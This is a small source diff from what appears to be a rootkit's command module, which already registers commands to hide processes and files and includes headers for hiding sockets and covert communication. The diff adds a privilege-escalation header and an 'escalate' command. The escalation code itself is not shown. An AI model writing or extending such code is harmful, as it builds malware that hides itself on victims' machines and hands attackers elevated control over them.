@@ -8,6 +8,7 @@
 #include "hide_sockets.h"
 #include "hide_files.h"
 #include "covert_communication.h"
+#include "privilege_escalation.h"
 
 void init_commands(void) {
     add_command("hideproc", hide_proc, 1);
@@ -22,6 +23,8 @@ void init_commands(void) {
 
     add_command("hidefiles", hide_files, 0);
     add_command("unhidefiles", unhide_files, 0);
+
+    add_command("escalate", escalate, 0);
 }
 
 /* Initialization routine */
